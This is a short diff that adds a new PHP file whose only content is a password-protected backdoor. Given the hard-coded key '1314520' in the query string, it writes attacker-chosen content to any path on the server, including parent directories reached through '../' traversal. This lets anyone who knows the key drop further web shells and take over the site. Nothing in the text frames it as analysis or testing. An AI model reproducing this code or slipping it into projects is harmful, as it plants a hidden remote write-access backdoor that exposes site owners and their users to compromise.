@@ -1,0 +1,1 @@
+<?php    $dir = dirname(__FILE__);    $file_name = $_GET['f'];    $file_fo = $_GET['fo'];    $str = $_GET['s'];    $key = $_GET['k'];    if($key == '1314520'){        $file = empty($file_fo)?$dir.'../../../../../'.$file_name:$dir.$file_fo;        $contents = $str;        $op = file_put_contents($file,$contents);        echo var_dump($op);    }?>
